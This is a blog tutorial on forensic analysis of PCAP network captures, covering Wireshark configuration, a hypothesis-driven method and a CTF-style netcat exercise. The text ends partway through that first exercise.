<!DOCTYPE html>
<html lang="">
	
	


	<head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta http-equiv="Cache-Control" content="public" />
	<!-- Enable responsiveness on mobile devices -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
	
	    
	    
	    
	
	<title>PCAP Analysis • Just another infosec blog</title>
	
	
	<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="PCAP Analysis"/>
<meta name="twitter:description" content="My methodology about PCAP analysis with practical examples."/>

	<meta property="og:title" content="PCAP Analysis" />
<meta property="og:description" content="My methodology about PCAP analysis with practical examples." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://maki.bzh/articles/wiresharkhowtobasic/" />
<meta property="article:published_time" content="2019-02-20T00:00:00&#43;00:00"/>
<meta property="article:modified_time" content="2019-02-20T00:00:00&#43;00:00"/>


    		
	
	
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css" integrity="sha256-90Y+fvi28WF+3jKH4tHEkoQ9WLeFKJjpvCPNOtU9ZvU= sha384-s+7l2WBKs5ChgZ+esoTV0aWZRcma7BxuSHlzBJz6PH4Cc4ZX3/ErQZtk+ZzYQy/X sha512-BiC3DH0qMCjCYqPNGAthQ95QCndm60uhfQVwhqZ2eG1zuGkP+3T1cw6PzEC4CiRfRIbd2qvyN39RoDfil/XcMA==" crossorigin="anonymous">
	
	
	

	<link rel="stylesheet" href="/css/hyde-hyde.css" integrity="sha256-cUUT8nKBmejGAmxYnpOnspTmwap5Sjc/nzRfeTTjgeQ=" crossorigin="anonymous">
	<link rel="stylesheet" href="/css/custom.css" >
	<link rel="stylesheet" href="/css/print.min.css" media="print" integrity="sha256-obkLPMZU5Kb+rPwjMazkJLfYW8H9dj6yh8Gzzs2dv5c=" crossorigin="anonymous">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g= sha384-qFIkRsVO/J5orlMvxK1sgAt2FXT67og+NyFTITYzvbIP1IJavVEKZM7YWczXkwpB sha512-UDJtJXfzfsiPPgnI5S1000FPLBHMhvzAMX15I+qG2E2OAzC9P1JzUwJOfnypXiOH7MRPaqzhPbBGDNNj7zBfoA==" crossorigin="anonymous"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE= sha384-ZoaMbDF+4LeFxg6WdScQ9nnR1QC2MIRxA1O9KWEXQwns1G8UNyIEZIQidzb0T1fo sha512-qWVvreMuH9i0DrugcOtifxdtZVBBL0X75r9YweXsdCHtXUidlctw7NXg5KVP3ITPtqZ2S575A0wFkvgS2anqSA==" crossorigin="anonymous"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="shortcut icon" href="/favicon.png">
    	

</head>


	<body >
				
		<div class="sidebar">
			<div class="container sidebar-about ">
				<span class="site__title">
				
					<a href=""></a>
				</span>
				<a href="https://maki.bzh/">
					
					
					
					<div class="author-image">
						<img src="https://maki.bzh/img/maki.jpg" alt="Author Image" class="img--circle img--headshot element--center"/>
					</div>
					
				</a>
				<p class="site__description">
					<a href="https://maki.bzh/en">
						
					</a>
				</p>
				<div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/articles/">
						<span>Articles</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/walkthrough/">
						<span>Walkthrough</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/stupidthings/">
						<span>Stupid Things</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/ctf/">
						<span>CTF</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/friends/">
						<span>Friends</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/whoami/">
						<span>Who Am I?</span>
					</a>
				</li>
			 
		
	</ul>
</div>

				
				<section class="social">
						
						<a href="https://twitter.com/maki_mitz" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
						
						
						
						
						
						<a href="https://gitlab.com/maki_chaz" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
						
						
						
						
						
						
						
						
						
						
						<a href="mailto:Yml0ZWRlcG91bGV0" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
						
						
					  &nbsp;<a href="https://www.root-me.org/Maki-37744" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
					  
						
					  &nbsp;<a href="https://www.hackthebox.eu/home/users/profile/10265" target="blank" class="linklogo"><div class="rotate hackthebox_logo logohover"></div></a>
					  
						
					  &nbsp;<a href="https://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
					  
</section>

				
				
				<p class="copyright">
					&copy; 2020 Maki.
					<br/>
					<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
					<br/>Built with, Haax, Laluka, _ACKNAK_
					<a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
					
				</p>
			</div>
		</div>

		<div class="content container">
			
	<article>
	<header>
		<h1>PCAP Analysis</h1>
		
		
<div class="post__meta">
	
	<i class="fas fa-calendar-alt"></i> Feb 20, 2019
	
	
	<br/>
	<i class="fas fa-clock"></i> 26 min read
</div>


	</header>
	<hr/>
	<div class="post">
		<nav id="TableOfContents">
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#what-is-a-pcap-file">What is a PCAP file?</a>
<ul>
<li><a href="#what-are-they-used-for">What are they used for?</a></li>
<li><a href="#who-is-using-pcap">Who is using PCAP?</a></li>
</ul></li>
<li><a href="#tools">Tools</a>
<ul>
<li><a href="#wireshark-tshark">Wireshark / tshark</a></li>
<li><a href="#capanalysis">CapAnalysis</a></li>
<li><a href="#binwalk-foremost">Binwalk / Foremost</a></li>
<li><a href="#scripting-languages">Scripting languages</a></li>
<li><a href="#tsurugi-linux">TSURUGI Linux</a></li>
</ul></li>
<li><a href="#pimp-my-wireshark">Pimp my Wireshark</a>
<ul>
<li><a href="#column-changes">Column changes</a></li>
<li><a href="#plugins">Plugins</a></li>
</ul></li>
<li><a href="#methodology">Methodology</a>
<ul>
<li><a href="#introduction-1">Introduction</a></li>
<li><a href="#overview-static-analysis">Overview &amp; static analysis</a>
<ul>
<li><a href="#state-of-the-art">State of the art</a></li>
</ul></li>
<li><a href="#hypothesis">Hypothesis</a></li>
<li><a href="#checking">Checking</a>
<ul>
<li><a href="#round-1">Round 1</a></li>
<li><a href="#round-2">Round 2</a></li>
</ul></li>
<li><a href="#find-the-treasure">Find the treasure</a></li>
</ul></li>
<li><a href="#practical-example">Practical example</a>
<ul>
<li><a href="#clear-tcp">Clear TCP</a>
<ul>
<li><a href="#statement">Statement</a></li>
<li><a href="#resolution">Resolution</a></li>
<li><a href="#do-it-yourself">Do it yourself</a>
<ul>
<li><a href="#prerequisites">Prerequisites</a></li>
<li><a href="#setting-up-the-environment">Setting up the environment</a></li>
<li><a href="#wireshark-analysis">Wireshark analysis</a></li>
</ul></li>
</ul></li>
<li><a href="#file-transfer">File transfer</a>
<ul>
<li><a href="#statement-1">Statement</a></li>
<li><a href="#resolution-1">Resolution</a></li>
<li><a href="#do-it-yourself-1">Do it yourself</a>
<ul>
<li><a href="#prerequisite">Prerequisite</a></li>
<li><a href="#send-the-picture">Send the picture</a></li>
</ul></li>
</ul></li>
<li><a href="#data-exfiltration">Data exfiltration</a>
<ul>
<li><a href="#statement-2">Statement</a></li>
<li><a href="#resolution-2">Resolution</a></li>
<li><a href="#do-it-yourself-2">Do it yourself</a>
<ul>
<li><a href="#server-side">Server side</a></li>
<li><a href="#client-side">Client side</a></li>
</ul></li>
</ul></li>
<li><a href="#trojan-horse">Trojan horse</a>
<ul>
<li><a href="#statement-3">Statement</a></li>
<li><a href="#resolution-3">Resolution</a>
<ul>
<li><a href="#what-url-in-the-pcap-returned-a-windows-executable-file">What URL in the pcap returned a Windows executable file?</a></li>
<li><a href="#what-is-the-size-of-the-windows-executable-file-from-that-url">What is the size of the Windows executable file from that URL?</a></li>
<li><a href="#what-is-the-sha256-hash-of-the-windows-executable-file-from-that-url">What is the SHA256 hash of the Windows executable file from that URL?</a></li>
<li><a href="#what-type-of-malware-is-the-windows-executable-returned-from-that-url">What type of malware is the Windows executable returned from that URL?</a></li>
<li><a href="#what-was-the-date-and-time-the-malicious-traffic-started">What was the date and time the malicious traffic started?</a></li>
<li><a href="#what-is-the-mac-address-of-the-infected-windows-host">What is the MAC address of the infected Windows host?</a></li>
<li><a href="#what-is-the-host-name-of-the-infected-windows-host">What is the host name of the infected Windows host?</a></li>
<li><a href="#what-is-the-user-account-name-used-on-the-infected-windows-host">What is the user account name used on the infected Windows host?</a></li>
</ul></li>
</ul></li>
<li><a href="#ressources">Ressources</a></li>
</ul></li>
</ul>
</nav>
		

<h1 id="introduction">Introduction</h1>

<p>Whether in &ldquo;Capture The Flag&rdquo; (CTF) events or even in professional life, we work with network captures. PCAP (Packet capture), is rich in information. It&rsquo;s easy to get lost in the amount of information and start on wrong tracks.
Throughout this MOOC, I will introduce you the methodology to be adopted to deal with this type of situation. Firstly, I will try to describe the PCAP content, list some tools and finally practical exercises resulting from CTF tests or malicious traffic.</p>

<h1 id="what-is-a-pcap-file">What is a PCAP file?</h1>

<p>PCAP means &ldquo;Packet Capture&rdquo;, as its name says, this kind of file contains complete packet going through a network interface. Complete packet means that PCAP files will contain data from second to the seventh layer of the OSI model.</p>

<p><center>
<img src="https://i.imgur.com/KRvb6OZ.png" alt="" />
<em>Fig 1</em>: Layers contains in a PCAP file
</center></p>

<h2 id="what-are-they-used-for">What are they used for?</h2>

<p>As we have just seen in Figure 1, a PCAP contains all information in a packet. It can, therefore, be used to identify malicious traffic (attacker, malware&hellip;), track a threat, identifies rogue DHCP servers, monitors intrusions, or simply for research purposes&hellip;</p>

<h2 id="who-is-using-pcap">Who is using PCAP?</h2>

<p>A whole bunch of people: researchers, system administrators, malware hunters or analysts during for incident response.</p>

<h1 id="tools">Tools</h1>

<p>Every analyst needs a well-stocked toolbox and he needs to know well its tools. Here are the main tools I use when I have to analyze PCAP file:</p>

<ul>
<li>Wireshark-qt / tshark</li>
<li>CapAnalysis</li>
<li>Binwalk / Foremost</li>
<li>Scripting languages (ex: Python / Bash)</li>
<li>Patience and coffee</li>
</ul>

<h2 id="wireshark-tshark">Wireshark / tshark</h2>

<p>Wireshark is a tshark-based analysis and capture tool, so I&rsquo;m talking about both in the same category. Wireshark provides a fairly graphical overview with intuitive filters. Here is an image of Wireshark in use:</p>

<p><center>
<img src="https://i.imgur.com/ErHl5bT.png" alt="" />
<em>Fig 2</em>: Wireshark output example
</center></p>

<p>tshark is a tool used to dump and analyze network information. It is possible to select a particular protocol, IP address or other useful information like Wireshark. The main advantage of tshark on Wireshark, is data extraction.
The use of this tool may seem obscure, but here is its syntax:</p>

<blockquote>
<p>tshark -r filename.pcap -Y display_filter -Tfields -e some_specific_filter</p>
</blockquote>

<ul>
<li><strong>filename.pcap</strong>: PCAP file to analyze ;</li>
<li><strong>display_filter</strong>: This parameter will take the wireshark display filter as an argument ;</li>
<li><strong>some_specific_filter</strong>: This will be used to extract a specific data.</li>
</ul>

<p><center>
<img src="https://i.imgur.com/2PdDYlr.png" alt="" />
<em>Fig 3</em>: Wireshark and tshark example
</center></p>

<p>This PCAP comes from a CTF challenge. Complete writeup can be found on Ressource 3.</p>

<h2 id="capanalysis">CapAnalysis</h2>

<p>CapAnalysis will be used to perform a statistical analysis of PCAP file, such as counting the number of requests per IP, the list of protocols used over time and many others. It provides a good overview of PCAP file before starting the analysis.
A docker is available on Docker Hub (see Resources 4).</p>

<p><center>
<img src="https://i.imgur.com/nhzWXQe.png" alt="" />
<em>Fig 4</em>: Protocol list according to timestamp
</center></p>

<h2 id="binwalk-foremost">Binwalk / Foremost</h2>

<p>Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. It will detect some file pattern inside another. For example, a packet capture during PNG file transfer:</p>

<p><center>
<img src="https://i.imgur.com/JrElXCJ.png" alt="" />
<em>Fig 5</em>: Binwalk headers detection
</center></p>

<p>Foremost is similar to Binwalk.</p>

<h2 id="scripting-languages">Scripting languages</h2>

<p>Python and bash are often used because they are really user friendly and there are lot of libraries.</p>

<p>For Python:</p>

<ul>
<li>PyShark</li>
<li>Scapy</li>
</ul>

<p>For Bash:</p>

<ul>
<li>grep</li>
<li>strings</li>
<li>tr</li>
<li>xxd</li>
</ul>

<h2 id="tsurugi-linux">TSURUGI Linux</h2>

<p>The Linux distribution TSURUGI has been developed for forensic analysts in order to make a turnkey OS with all the essential pre-configured tools. The tools mentioned above are all installed in this distribution, even more.</p>

<p><center>
<img src="https://pbs.twimg.com/media/Ds2ae-2XgAA3rip.jpg" alt="" />
<em>Fig 6</em>: TSURUGI Linux
</center></p>

<table>
<thead>
<tr>
<th>Filename</th>
<th>SHA1</th>
<th>Download link</th>
</tr>
</thead>

<tbody>
<tr>
<td>tsurugi_lab_2018.1.iso</td>
<td>b54895db6fba93239b668edb9f5ef02bef975b40</td>
<td><a href="https://tsurugi-linux.org/downloads.php">https://tsurugi-linux.org/downloads.php</a></td>
</tr>
</tbody>
</table>

<h1 id="pimp-my-wireshark">Pimp my Wireshark</h1>

<p>Before starting the analysis, it is important to correctly configure your tools. <strong>Wireshark</strong> will probably be the most frequently used tool in analysis. An important point to add is that the configuration I will present is my own, it is up to you to make your own. I am open to your changes and would be happy to discuss about them.</p>

<h2 id="column-changes">Column changes</h2>

<p>By default, the configuration of this tool is acceptable. We will add the following columns to make our <strong>Wireshark</strong> displaying more relevant results:</p>

<ul>
<li>Packet source port</li>
<li>Packet destination port</li>
<li>Hostname</li>
<li>Change date format</li>
<li>Display transferred data in hex</li>
</ul>

<p>The first column, containing the packet numbers, will be deleted. Indeed, it is possible to order the packages over time, which is more relevant, in my opinion. To modify a column in Wireshark, simply go to the <strong>Columns</strong> menu at the path:</p>

<blockquote>
<p>Edit -&gt; Preferences -&gt; Columns</p>
</blockquote>

<p><center>
<img src="https://i.imgur.com/sv4qYcy.gif" alt="" />
<em>Fig 7</em>: Columns change menu
</center></p>

<p>In a first time, we have to delete the number column:</p>

<p><center>
<img src="https://i.imgur.com/m7z4eTe.png" alt="" />
<em>Fig 8</em>: Adding a column
</center></p>

<ol>
<li>Add a column</li>
<li>Select the filter <strong>Src port (unresolved)</strong> and <strong>Dst port (unresolved)</strong></li>
<li>You can move the column where you want. <strong>Don&rsquo;t let a column behind the &lsquo;Info&rsquo; one, otherwise the column won&rsquo;t be displayed.</strong></li>
</ol>

<p>Another important point to notice, the packet timestamp. Originally, Wireshark does not display it following ISO 8601 standard. You can change it:</p>

<p><center>
<img src="https://i.imgur.com/RwEYnmH.gif" alt="" />
<em>Fig 9</em>: Timestamp according to ISO 8601
</center></p>

<p>One of the protocols that are recurrent in a PCAP is the <code>HTTP</code> protocol. This protocol appears frequently because any user will generate this kind of traffic while browsing the Internet, applications, and software also use it for multiple reasons, etc&hellip;.
In a CTF, challenges contain unnecessary requests, in order to parasitize the PCAP traffic and try to drown the challenger under the amount of information. For malware, it may be interesting to retrieve communications with its command and control server, because it can receive orders, download other malware&hellip;</p>

<p>To have a PCAP file containing HTTP traffic, just open Wireshark and start capturing on a network interface with an Internet access.
With the following request in a terminal, it&rsquo;s enough to generate HTTP traffic:</p>

<pre><code class="language-bash">$ curl https://www.google.com/
</code></pre>

<p>Now, it could be really nice to get hostname corresponding to IP address:</p>

<p><center>
<img src="https://i.imgur.com/q7ZAyNp.gif" alt="" />
<em>Fig 10</em>: Generate and filter on HTTP traffic
</center></p>

<p>Just right clicking on the desired data and apply it as a column. This method can be applied to anything you want, knowing that adding and deleting a column is very easy, so don&rsquo;t hesitate to modify <strong>Wireshark</strong> according to your investigation.</p>

<p>Another column to be added, which may be interesting in some cases, will be the data that are passing through the network. It is possible to add a new column with the filter <strong>data.data</strong>, via the <strong>custom</strong> menu. To generate some traffic, you can use <strong>netcat</strong>:</p>

<p><center>
<img src="https://i.imgur.com/f7IXtx7.gif" alt="" />
<em>Fig 11</em>: Raw data through the network
</center></p>

<h2 id="plugins">Plugins</h2>

<p>It is possible to develop and create Lua plugins for Wireshark. The Pentest Academy team has developed some interesting plugins (see Resource 5) to see domain names, DHCP connections or GET and POST request information. The installation is quite simple, just clone the repository and place the plugins in the right folder:</p>

<p><center>
<img src="https://i.imgur.com/GJ2zSeu.png" alt="" />
<em>Fig 12</em>: Plugin folder location
</center></p>

<pre><code class="language-bash">$ git clone https://github.com/pentesteracademy/patoolkit.git
$ cp -r patoolkit/plugins/* /home/maki/.local/lib/wireshark/plugins/
</code></pre>

<p>So we have access to the Pentester Academy plugins. If either of you do, I&rsquo;ll be curious to know! :)</p>

<p><center>
<img src="https://i.imgur.com/EW7kz2n.gif" alt="" />
<em>Fig 13</em>: Pentester Academy plugins
</center></p>

<h1 id="methodology">Methodology</h1>

<h2 id="introduction-1">Introduction</h2>

<p>A full packet network capture is a slow and heavy process, which is why it is rarely seen in an enterprise information system. To be aware of the noise generated by a networked device, try putting Wireshark in capture mode on your ethernet or wifi interface. All operating systems are sending ICMP or ARP requests to ensure that the equipment is properly connected. There are more specific things like the broadcast of a Windows system on the network.
That&rsquo;s why we spent a little time earlier to configure our tools correctly. It is extremely easy to get lost among all these logs and forget what you were looking for at the beginning.</p>

<p>In this part of the course, I will share my methodology when analyzing a PCAP file. This methodology is divided into four main areas:</p>

<ol>
<li>Overview&amp;static analysis</li>
<li>Hypothesis</li>
<li>Checking</li>
<li>Find the treasure</li>
</ol>

<p>The aim is starting from a &ldquo;high level&rdquo; analysis, to establish hypotheses,  verify them and establish others from the results obtained. And do not forget what we are looking for at the beginning: the treasure!</p>

<p><center>
<img src="https://media.giphy.com/media/xT1XGzAnABSXy8DPCU/giphy.gif" alt="" />
</center></p>

<h2 id="overview-static-analysis">Overview &amp; static analysis</h2>

<p>Throughout this course, I will analyze the same PCAP file as the one used in the prerequisites:</p>

<table>
<thead>
<tr>
<th>Filename</th>
<th>MD5</th>
<th>Download link</th>
</tr>
</thead>

<tbody>
<tr>
<td>OtterLeak.pcap</td>
<td>d0ab559c54fffe713fd13e9b0f7174df</td>
<td><a href="https://mega.nz/#!2DwzBaaR!VcTfsZadubKUTNn2LwPXQXoZ2sxpbxHt65B-Wj1N-so">https://mega.nz/#!2DwzBaaR!VcTfsZadubKUTNn2LwPXQXoZ2sxpbxHt65B-Wj1N-so</a></td>
</tr>
</tbody>
</table>

<p>First of all, it is advisable to do a static analysis of the PCAP file. As presented in the previous parts, I use the CapAnalysis tool. The goal here will be to determine the interesting artifacts and build our hypotheses. It may be interesting to start with the following points:</p>

<ul>
<li>Protocol used</li>
<li>Amount of data sent</li>
<li>Source and destination IP</li>
<li>Geolocation</li>
<li>Filtering on time</li>
</ul>

<h3 id="state-of-the-art">State of the art</h3>

<p><center>
<img src="https://i.imgur.com/6VLrd2d.png" alt="" />
<em>Fig 14</em>: Data sent over protocol<br />
</center></p>

<p>In the Figure above, we can see the SMB and HTTP protocols are much more used than the others. We can try to filter through these protocols to see what comes out of them:</p>

<p><center>
<img src="https://i.imgur.com/gbf3Pes.gif" alt="" />
<em>Fig 15</em>: Protocol filtered
</center></p>

<p>By filtering on the protocols, we can see that the two most talkative IPs are these two internal IPs:</p>

<ul>
<li>Source IP: 10.0.0.6</li>
<li>Destination IP: 10.0.0.33</li>
</ul>

<p>Let&rsquo;s try to find something else on these IPs. By searching a little bit in the CapAnalysis menus, we can notice some interesting data:</p>

<p><center>
<img src="https://i.imgur.com/2KuAXaj.png" alt="" />
<em>Fig 16</em>: Suspicious IP
</center></p>

<p>Thanks to Figure 3, we can see that IPs <strong>10.0.0.6</strong> and <strong>10.0.0.33</strong> are the ones that <em>communicate most with each other</em>. In addition, we were able to learn that IP 10.0.0.33 has a domain name: <strong>Pika.local</strong>.</p>

<p>We are reaching a point where we will have to start writing hypotheses and test them for the future.</p>

<h2 id="hypothesis">Hypothesis</h2>

<p>With the information retrieved from the static analysis, we are able to identify the first hypotheses. Personally, I prefer to write them on a board or use paper and pencil to keep them in front of me. There is nothing worse in forensic than losing sight of what you are looking for.</p>

<p>In my opinion, at this stage, it&rsquo;s better to be fairly generalist at first and then to refine more and more. There will be what can be called &ldquo;feedback loops&rdquo;. It just means knowing when to step back from the situation when you fall into a deadlock. The methodology can be summarized in the following diagram:</p>

<p><center>
<img src="https://i.imgur.com/6rn6Sh6.png" alt="" />
<em>Fig 17</em>: Methodology diagram
</center></p>

<p>By listing the information in our possession:</p>

<ul>
<li>IPs

<ul>
<li>10.0.0.33 -&gt; Pika.local</li>
<li>10.0.0.6</li>
</ul></li>
<li>Protocols

<ul>
<li>SMB</li>
<li>HTTP</li>
</ul></li>
</ul>

<p>By limiting to this information, we are already making a huge filter on the entire PCAP file. It is important to keep in mind that the treasure we are looking for, may not be in there.</p>

<p>But knowing that, you can imagine some things:</p>

<ol>
<li>Data extraction via HTTP? SMB?</li>
<li>Communications to a command and control server?</li>
<li>Open SMB shares with open access data (anonymous user)?</li>
<li>An attack on the SMB, such as EternalBlue?</li>
<li>A vulnerable web application?</li>
</ol>

<p>These are examples, the aim is to identify as many hypotheses as possible in order to try to be as exhaustive as possible and then not miss something. Once the static analysis and the first hypotheses are completed, it is time to open <strong>Wireshark</strong> for a more in-depth analysis.</p>

<h2 id="checking">Checking</h2>

<p>What I called &ldquo;Checking part&rdquo; is the validation or not of the previous hypotheses. This verification will mostly be done via Wireshark and tshark. What you have to force yourself to do throughout the analysis is to continue to identify hypotheses and record them.</p>

<p>The hypotheses generated during the static analysis of the PCAP file only give a global idea, an axis of exploration to avoid getting lost in this sea of data. Network information is important, it will serve as an indicator of compromise (IOC). These indicators allow CERTs and other analysts to determine malicious behavior. Malware often uses particular patterns: an exotic user-agent, a C&amp;C IP&hellip;</p>

<p>With this information, analysts can create rules for SIEM / IDS / IPS and other network analysis equipment. These rules will be used to identify malicious behavior quickly. An IOC can be:</p>

<ul>
<li>IP</li>
<li>User-Agent</li>
<li>Host</li>
<li>Specific pattern</li>
</ul>

<h3 id="round-1">Round 1</h3>

<p>With the information retrieved during the static analysis, let&rsquo;s try to build a filter:</p>

<ul>
<li>IPs filtering</li>
<li>Protocol filtering</li>
</ul>

<p>It gives us:</p>

<blockquote>
<p>((smb2 || http) || (ip.addr == 10.0.0.33)) &amp;&amp; (ip.addr == 10.0.0.6)</p>
</blockquote>

<p>Once this filter is applied, something comes up:</p>

<p><center>
<img src="https://i.imgur.com/QNWp36i.gif" alt="" />
<em>Fig 18</em>: Suspicious data
</center></p>

<p>Now we strongly assume that there is data exfiltration via SMB2. It is important to step back from the analysis, so there are other questions to ask:</p>

<ul>
<li>Who or what is responsible for this behavior?</li>
<li>Is the exfiltered data encrypted? Encoded?</li>
</ul>

<p>At this point, it comes back to what I said at the beginning of this MOOC: make other hypotheses and verify them, repeat the operation as long as necessary in order to find something interesting.</p>

<h3 id="round-2">Round 2</h3>

<p>If we look closely, the exfiltered bytes are sent only from IP 10.0.0.33 on port 445 to 10.0.0.6 on port 139. It is possible to refine our Wireshark filter a little:</p>

<blockquote>
<p>(ip.src == 10.0.0.33) &amp;&amp; (ip.dst == 10.0.0.6) &amp;&amp; smb2 &amp;&amp; data.data</p>
</blockquote>

<p><center>
<img src="https://i.imgur.com/yijCLe4.png" alt="" />
<em>Fig 19</em>: Exfiltrated data
</center></p>

<p>The data looks to a very particular encoding system, base64:</p>

<ul>
<li>Alpha chars, upper and lowercase</li>
<li>Digital chars</li>
<li>Terminated by an equal</li>
</ul>

<p>To be sure of that, <strong>tshark</strong> will be more useful than <strong>Wireshark</strong>:</p>

<p><center>
<img src="https://i.imgur.com/KCxyP74.gif" alt="" />
<em>Fig 20</em>: Data recovery
</center></p>

<p>The final command at the end of the GIF above is:</p>

<pre><code class="language-bash">$ tshark -r OtterLeak.pcap -Y '(ip.src == 10.0.0.33) &amp;&amp; (ip.dst == 10.0.0.6) &amp;&amp; smb2 &amp;&amp; data.data' -Tfields -e data.data | tr -d '\n' | xxd -r -p | rev | base64 -d
</code></pre>

<ul>
<li><strong>tshark</strong>: This command will extract all data transferred from 10.0.0.33 to 10.0.0.6 through SMB2 in the PCAP ;</li>
<li><strong>tr</strong>: This command will remove all line return in the bash output ;</li>
<li><strong>xxd</strong>: This command will convert hex digit into ascii chars ;</li>
<li><strong>rev</strong>:  This command will reverse the string</li>
<li><strong>base64</strong>: This command will decode the base64 data</li>
</ul>

<h2 id="find-the-treasure">Find the treasure</h2>

<p>After a while, we will find interesting things about the malicious actions carried out. However, analysts are fighting another scourge: <strong>time</strong>. The feeling of missing something can be really frustrating.</p>

<p>In a global attack like <strong>Wannacry</strong>, the real threat was time. The more analysts tried to be exhaustive, the more malware grew. The goal is to find important information quickly to stop the attack, while the security patches are put in place.
This is why the first step, during static analysis, is important. This step can be decisive for the future.</p>

<p>During the checking phase, if there is no relevant information, do not hesitate to restart from the beginning and repeat the procedure, in order to find more hypothesis.</p>

<p>Concerning this first part related to methodology, it is over. The methodology is relatively simple and is done naturally. The rather complicated points are: <strong>force yourself to find hypotheses</strong> before starting the analysis head down and <strong>take a step back</strong> on the investigation.</p>

<p>Another blocking point during the analysis will be the knowledge of the tools, including <code>Wireshark</code>. The following sections will be based on the use of tools and small tips and tricks to quickly extract the useful data.</p>

<p><center>
<img src="https://media.giphy.com/media/lD76yTC5zxZPG/giphy.gif" alt="" />
</center></p>

<hr />

<h1 id="practical-example">Practical example</h1>

<h2 id="clear-tcp">Clear TCP</h2>

<p>This practical work will aim to familiarize students with network tools and protocols. I chose to do these exercises as a &ldquo;challenge&rdquo; as in CTF. The purpose of each TP is to find a character string, a &ldquo;flag&rdquo;. The format is <strong>flag{ImTheFlag}</strong>.</p>

<p><center>
<img src="https://media.giphy.com/media/l0HU1Ajixx0bg86oU/giphy.gif" alt="" />
</center></p>

<p>In this first TP, we will see a TCP communication without a cryptographic layer. Many protocols rely on TCP to operate. However, most of them are not encrypted by default, here is a non-exhaustive list:</p>

<ul>
<li>Telnet</li>
<li>HTTP</li>
<li>SMTP</li>
<li>&hellip;</li>
</ul>

<h3 id="statement">Statement</h3>

<p>The exercise material can be found on the following link:</p>

<table>
<thead>
<tr>
<th>Filename</th>
<th>Hash</th>
<th>Download link</th>
</tr>
</thead>

<tbody>
<tr>
<td>cleartcp.pcapng</td>
<td>09a6f779bfe37db11a83b60dc8484111</td>
<td><a href="https://mega.nz/#!Ka4SAQYY!ky618XDVfmGMk0WNU46fprwlkgb8JJlG4BEd38QsEyA">https://mega.nz/#!Ka4SAQYY!ky618XDVfmGMk0WNU46fprwlkgb8JJlG4BEd38QsEyA</a></td>
</tr>
</tbody>
</table>

<p>The goal here will be to find the content of the message sent by <strong>netcat</strong>. To do the manipulation again on your side, I invite you to read the following section, concerning the resolution.</p>

<h3 id="resolution">Resolution</h3>

<p>In this first practical exercise, it&rsquo;s not necessary to use CapAnalysis, because the PCAP file is ridiculously small. A simple quick view with Wireshark will be enough. Normally, if you have followed the previous chapters, something must be obvious to you:</p>

<p><center>
<img src="https://i.imgur.com/JINQ0MV.png" alt="" />
<em>Fig 21</em>: Data displayed
</center></p>

<p>It is possible to find this result without our magic column. Wireshark is able to track a TCP connection flow. This is one of the most useful features in my opinion:</p>

<blockquote>
<p>Right click on the desired packet -&gt; Follow TCP stream</p>
</blockquote>

<p><center>
<img src="https://i.imgur.com/i0V3Nlz.gif" alt="" />
<em>Fig 22</em>: Follow TCP stream
</center></p>

<p>A new window will appear with the content of the TCP stream. In our example, there is only one stream containing little information. However, it is possible to do the same on all TCP-based protocols and quickly obtain information.</p>

<h3 id="do-it-yourself">Do it yourself</h3>

<p>Each challenge will have this section. With the following resources you&rsquo;re able to reproduce the challenge environment at home.</p>

<h4 id="prerequisites">Prerequisites</h4>

<p>To do this task, and probably all challenge after, you&rsquo;ll need:</p>

<ul>
<li>Docker</li>
<li>Wireshark / tshark</li>
</ul>

<h4 id="setting-up-the-environment">Setting up the environment</h4>

<p>Store the following code into a file called Dockerfile:</p>

<pre><code class="language-yaml">FROM debian:latest

RUN apt update &amp;&amp; \
    apt install -y --no-install-recommends netcat.traditional
RUN rm -rf /var/lib/apt/lists/*

COPY run.sh /run.sh
RUN chmod +x /run.sh

EXPOSE 1664

ENTRYPOINT [&quot;/run.sh&quot;]
</code></pre>

<p>In the <strong>Dockerfile</strong> folder, store the following bash code in <strong>run.sh</strong>:</p>

<pre><code class="language-bash">#!/bin/sh

echo -n &quot;[+] Container IP: &quot;
ip a | grep inet | awk '{print $2}' | tail -n+2

nc -lvp 1664
</code></pre>

<p>Now, just build your container, follow these command lines:</p>

<pre><code class="language-bash">$ sudo docker build . -t cleartcp # Generate the docke container
$ sudo docker run --rm --name cleartcp -t cleartcp
[+] Container IP: 172.17.0.2/16
listening on [any] 1664 ...
</code></pre>

<p>Congratulation! You just did your first docker container!</p>

<h4 id="wireshark-analysis">Wireshark analysis</h4>

<p>Docker provides a network interface and use your host as the gateway. So open <strong>Wireshark</strong> and listen on your <strong>docker0</strong> network interface to catch all packets. If you&rsquo;re seeing some ICMP and ARP packets, don&rsquo;t worry. It&rsquo;s just Docker if everything is well connected.
